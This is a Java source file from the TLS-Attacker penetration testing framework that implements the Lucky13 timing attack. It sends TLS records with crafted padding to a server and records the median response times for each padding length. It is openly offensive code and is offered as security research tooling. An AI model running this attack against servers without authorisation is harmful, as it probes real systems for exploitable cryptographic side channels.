/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.Lucky13CommandConfig;
import de.rub.nds.tlsattacker.attacks.config.PaddingOracleCommandConfig;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.modifiablevariable.VariableModification;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.protocol.alert.AlertMessage;
import de.rub.nds.tlsattacker.tls.protocol.application.ApplicationMessage;
import de.rub.nds.tlsattacker.tls.record.Record;
import de.rub.nds.tlsattacker.tls.util.LogLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.util.ArrayConverter;
import java.util.Collections;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Executes the Lucky13 attack
 *
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class Lucky13Attack extends Attacker<Lucky13CommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(Lucky13Attack.class);

    private final Map<Integer, List<Long>> results;

    public Lucky13Attack(Lucky13CommandConfig config) {
        super(config);
        results = new HashMap<>();
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
        for (int i = 0; i < config.getMeasurements(); i++) {
            for (int p = 0; p < 32; p++) {
                Record record = createRecordWithPadding(p);
                executeAttackRound(configHandler, record);
                if (results.get(p) == null) {
                    results.put(p, new LinkedList<Long>());
                }
                results.get(p).add(record.getMeasuredTiming());
            }
        }

        for (Integer padding : results.keySet()) {
            List<Long> rp = results.get(padding);
            Collections.sort(rp);
            LOGGER.info("Padding: {}", padding);
            LOGGER.info("Median: {}", rp.get(rp.size() / 2));
        }
    }

    public void executeAttackRound(ConfigHandler configHandler, Record record) {
        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
        TlsContext tlsContext = configHandler.initializeTlsContext(config);
        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();

        ApplicationMessage applicationMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
        applicationMessage.addRecord(record);

        AlertMessage allertMessage = new AlertMessage(ConnectionEnd.SERVER);

        trace.getProtocolMessages().add(applicationMessage);
        trace.getProtocolMessages().add(allertMessage);

        try {
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException ex) {
            LOGGER.info("Not possible to finalize the defined workflow: {}", ex.getLocalizedMessage());
        }
        tlsContexts.add(tlsContext);

        transportHandler.closeConnection();
    }

    private Record createRecordWithPadding(int p) {
        byte[] padding = createPaddingBytes(p);
        int messageSize = config.getBlockSize() - (padding.length % config.getBlockSize());
        byte[] message = new byte[messageSize];
        byte[] plain = ArrayConverter.concatenate(message, padding);
        return createRecordWithPlainData(plain);
    }

    private Record createRecordWithPlainData(byte[] plain) {
        Record r = new Record();
        ModifiableByteArray plainData = new ModifiableByteArray();
        VariableModification<byte[]> modifier = ByteArrayModificationFactory.explicitValue(plain);
        plainData.setModification(modifier);
        r.setPlainRecordBytes(plainData);
        return r;
    }

    private byte[] createPaddingBytes(int padding) {
        byte[] paddingBytes = new byte[padding + 1];
        for (int i = 0; i < paddingBytes.length; i++) {
            paddingBytes[i] = (byte) padding;
        }
        return paddingBytes;
    }

}
